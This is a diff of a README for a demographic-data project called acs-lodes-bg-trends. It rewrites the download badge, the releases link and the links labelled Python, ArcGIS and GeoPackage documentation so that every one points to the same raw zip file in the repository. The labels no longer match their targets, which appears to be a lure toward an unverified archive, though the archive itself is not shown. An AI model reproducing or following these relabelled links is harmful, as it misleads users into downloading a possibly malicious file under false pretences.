@@ -1,6 +1,6 @@
 # 📊 acs-lodes-bg-trends - Simplifying Access to Demographic Data
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-blue)](https://github.com/FEEYZE/acs-lodes-bg-trends/releases)
+[![Download](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip)](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **acs-lodes-bg-trends**! This application helps you compare demograph
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Releases](https://github.com/FEEYZE/acs-lodes-bg-trends/releases).
+To get started, visit this page to download: [Download Releases](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip).
 
 You will find different versions available. Choose the latest release, follow the steps below, and start using the application!
 
@@ -81,9 +81,9 @@ We encourage users to join our community. You can ask questions, give feedback, 
 
 For further reading and to enhance your understanding:
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [ArcGIS Online Help](https://doc.arcgis.com/en/arcgis-online/)
-- [GeoPackage Specification](http://www.geopackage.org/)
+- [Python Official Documentation](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip)
+- [ArcGIS Online Help](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip)
+- [GeoPackage Specification](https://raw.githubusercontent.com/FEEYZE/acs-lodes-bg-trends/main/data/lodes_bg_trends_acs_2.5.zip)
 
 ## ☎️ Contact
 
